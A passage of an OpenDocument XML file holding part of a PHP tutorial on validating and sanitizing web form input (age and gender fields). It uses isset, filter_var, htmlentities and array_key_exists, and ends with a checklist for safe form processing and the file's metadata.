      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="16"/></text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">SANITIZED </text:span><text:span text:style-name="T168">.</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="16"/></text:span><text:span text:style-name="T168">filter_var(</text:span><text:span text:style-name="T135">$_POST</text:span><text:span text:style-name="T168">[</text:span><text:span text:style-name="T140">"name"</text:span><text:span text:style-name="T168">]</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T136">FILTER_SANITIZE_NUMBER_INT</text:span><text:span text:style-name="T168">) .</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="16"/></text:span><text:span text:style-name="T168">htmlentities(</text:span><text:span text:style-name="T135">$age</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T168">} </text:span><text:span text:style-name="T144">else </text:span><text:span text:style-name="T168">{</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T135">$processedAgeArray</text:span><text:span text:style-name="T168">[] = </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">SANITIZED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68">}</text:span></text:p>
      <text:p text:style-name="P69"><text:s text:c="4"/><text:span text:style-name="T167">}</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T144">return </text:span><text:span text:style-name="T135">$processedAgeArray</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P82">}<text:bookmark-end text:name="__DdeLink__2554_1458108310"/></text:p>
      <text:list xml:id="list7444996680750284869" text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P108"><text:bookmark-start text:name="__DdeLink__2609_1458108310"/><text:span text:style-name="T47">C</text:span><text:span text:style-name="T54">hecking up the existence and displaying raw data.</text:span><text:bookmark-end text:name="__DdeLink__2609_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P111"><text:bookmark-start text:name="__DdeLink__2611_1458108310"/><text:span text:style-name="T54">C</text:span><text:span text:style-name="T42">hecking up the format via «ctype» functions family member.</text:span><text:bookmark-end text:name="__DdeLink__2611_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P112"><text:bookmark-start text:name="__DdeLink__2613_1458108310"/><text:soft-page-break/><text:span text:style-name="T42">I display the data with a help of htmlentities() function and not with a filter_var(). Write «&lt;b&gt;18&lt;/b&gt;» to see the difference between such lind of processing and the way I process the name in such case.</text:span><text:bookmark-end text:name="__DdeLink__2613_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P125"><text:bookmark-start text:name="__DdeLink__2556_1458108310"/><text:span text:style-name="T85">private const </text:span><text:span text:style-name="T106">GENDER_INVALID_MESSAGE </text:span><text:span text:style-name="T62">= </text:span><text:span text:style-name="T112">"Do not deceive the system."</text:span><text:span text:style-name="T93">;</text:span></text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T145">private function </text:span><text:span text:style-name="T178">processGender</text:span><text:span text:style-name="T131">(?string </text:span><text:span text:style-name="T133">$gender</text:span><text:span text:style-name="T131">): </text:span><text:span text:style-name="T145">array</text:span></text:p>
      <text:p text:style-name="P65">{</text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T135">$processedGenderArray </text:span><text:span text:style-name="T168">= []</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="4"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T144">isset</text:span><text:span text:style-name="T168">(</text:span><text:span text:style-name="T135">$gender</text:span><text:span text:style-name="T168">)) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="8"/></text:span><text:span text:style-name="T177">//$gender = "enemy input";</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T176"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$processedGenderArray</text:span><text:span text:style-name="T168">[] = !</text:span><text:span text:style-name="T144">empty</text:span><text:span text:style-name="T168">(trim(</text:span><text:span text:style-name="T135">$gender</text:span><text:span text:style-name="T168">)) ? </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">RAW </text:span><text:span text:style-name="T168">. </text:span><text:span text:style-name="T135">$gender </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">RAW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35">$gendersBase </text:span><text:span text:style-name="T168">= [</text:span><text:span text:style-name="T140">"male" </text:span><text:span text:style-name="T168">=&gt; </text:span><text:span text:style-name="T162">0</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T140">"female" </text:span><text:span text:style-name="T168">=&gt; </text:span><text:span text:style-name="T162">1</text:span><text:span text:style-name="T168">]</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$isValid </text:span><text:span text:style-name="T168">= array_key_exists(</text:span><text:span text:style-name="T135">$gender</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T135">$gendersBase</text:span><text:span text:style-name="T168">)</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T135">$processedGenderArray</text:span><text:span text:style-name="T168">[] = (</text:span><text:span text:style-name="T135">$isValid</text:span><text:span text:style-name="T168">) ? </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">VALID_MESSAGE </text:span><text:span text:style-name="T168">: </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">GENDER_INVALID_MESSAGE</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T144">if </text:span><text:span text:style-name="T168">(!</text:span><text:span text:style-name="T144">empty</text:span><text:span text:style-name="T168">(trim(</text:span><text:span text:style-name="T135">$gender</text:span><text:span text:style-name="T168">))) {</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T135">$processedGenderArray</text:span><text:span text:style-name="T168">[] = </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">SANITIZED </text:span><text:span text:style-name="T168">. </text:span><text:span text:style-name="T135">$gender</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T168">} </text:span><text:span text:style-name="T144">else </text:span><text:span text:style-name="T168">{</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="12"/></text:span><text:span text:style-name="T135">$processedGenderArray</text:span><text:span text:style-name="T168">[] = </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">SANITIZED </text:span><text:span text:style-name="T168">. </text:span><text:span text:style-name="T144">self</text:span><text:span text:style-name="T168">::</text:span><text:span text:style-name="T136">EMPTY</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T141"><text:s text:c="8"/></text:span><text:span text:style-name="T168">}</text:span></text:p>
      <text:p text:style-name="P69"><text:s text:c="4"/><text:span text:style-name="T167">}</text:span></text:p>
      <text:p text:style-name="P60"><text:span text:style-name="T131"><text:s text:c="4"/></text:span><text:span text:style-name="T144">return </text:span><text:span text:style-name="T135">$processedGenderArray</text:span><text:span text:style-name="T143">;</text:span></text:p>
      <text:p text:style-name="P82">}<text:bookmark-end text:name="__DdeLink__2556_1458108310"/></text:p>
      <text:list xml:id="list548991011473628495" text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P113"><text:bookmark-start text:name="__DdeLink__2615_1458108310"/><text:span text:style-name="T42">I</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T42">m verifying the gender like pre-prepared parameter with a help of array_key_exists() function. You don</text:span><text:span text:style-name="T58">'</text:span><text:span text:style-name="T42">t need to be a hacker to mix POST parameters the way you like and add not standard value wherever you want.</text:span><text:bookmark-end text:name="__DdeLink__2615_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P114"><text:bookmark-start text:name="__DdeLink__2629_1458108310"/><text:span text:style-name="T42">Summing up </text:span><text:span text:style-name="T61">form processing</text:span><text:bookmark-end text:name="__DdeLink__2629_1458108310"/><text:span text:style-name="T42">:</text:span></text:p>
      <text:list xml:id="list3591306716846481507" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P115"><text:bookmark-start text:name="__DdeLink__2619_1458108310"/><text:span text:style-name="T42">Check the existence of variable with the key </text:span><text:span text:style-name="T57">with</text:span><text:span text:style-name="T55"> isset(), </text:span><text:span text:style-name="T56">filter_has_var()</text:span><text:span text:style-name="T55">.</text:span><text:bookmark-end text:name="__DdeLink__2619_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P116"><text:bookmark-start text:name="__DdeLink__2621_1458108310"/><text:span text:style-name="T55">C</text:span><text:span text:style-name="T42">heck the format with «ctype» family, filter_input() keys and preg_mach().</text:span><text:bookmark-end text:name="__DdeLink__2621_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P117"><text:bookmark-start text:name="__DdeLink__2625_1458108310"/><text:span text:style-name="T42">Sanitize data with htmlentities(), filter_var() sanitizing keys and <text:s/></text:span><text:span text:style-name="T54">casting type</text:span><text:span text:style-name="T42">s if possible.</text:span><text:bookmark-end text:name="__DdeLink__2625_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P118"><text:bookmark-start text:name="__DdeLink__2627_1458108310"/><text:span text:style-name="T42">Check the existence of key when working with the select, radio and checkbox tags.</text:span><text:bookmark-end text:name="__DdeLink__2627_14581083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18T18:00:57.829344218</dc:date>
    <meta:editing-duration>PT10H18M10S</meta:editing-duration>
    <meta:editing-cycles>100</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="13" meta:paragraph-count="365" meta:word-count="3570" meta:character-count="23832" meta:non-whitespace-character-count="19670"/>
  </office:meta>
</office:document-meta>
</file>